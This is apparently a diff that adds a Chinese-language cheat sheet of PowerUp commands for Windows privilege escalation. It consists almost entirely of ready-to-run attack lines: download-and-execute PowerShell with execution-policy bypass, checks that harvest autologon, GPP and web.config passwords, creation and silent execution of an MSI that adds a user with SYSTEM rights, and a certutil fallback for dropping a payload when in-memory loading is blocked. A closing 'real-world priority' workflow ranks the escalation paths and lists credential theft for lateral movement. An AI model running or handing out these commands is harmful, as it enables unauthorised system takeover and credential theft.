@@ -1,0 +1,40 @@
+项目地址:https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+
+> 内存加载 PowerUp 并执行全部检测（首选）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Invoke-AllChecks"
+> 检查未加引号的服务路径（常见提权点）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Get-ServiceUnquoted"
+> 检查可修改的服务（可直接提权）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Get-ModifiableService"
+> 检查服务二进制是否可写
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Get-ModifiableServiceFile"
+> 检查 AlwaysInstallElevated（MSI 提权关键）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Get-RegistryAlwaysInstallElevated"
+> 检查自动登录凭据（明文密码）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Get-RegistryAutoLogon"
+> 查找无人值守安装文件（可能含密码）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Get-UnattendedInstallFile"
+> 提取 web.config 中的凭据
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Get-WebConfig"
+> 获取 GPP 密码（域环境常见）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Get-CachedGPPPassword"
+> 查找 DLL 劫持机会
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Find-ProcessDLLHijack"
+> 生成 MSI 提权 payload（AlwaysInstallElevated）
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('$downloadurl'); Write-UserAddMSI"
+> 执行 MSI（触发 SYSTEM 权限）
+msiexec /quiet /qn /i UserAdd.msi
+> 落地执行（IEX 被拦截时使用）
+cd %TEMP% && certutil -urlcache -split -f $downloadurl $badfile && powershell -exec bypass -File %TEMP%\$badfile
+
+###
+核心流程（实战优先级）：
+1. 先执行：
+   Invoke-AllChecks
+2. 优先利用：
+   - 服务提权（最稳定）
+   - AlwaysInstallElevated（最快）
+3. 再考虑：
+   - 凭据获取（横向移动）
+   - DLL 劫持
+###
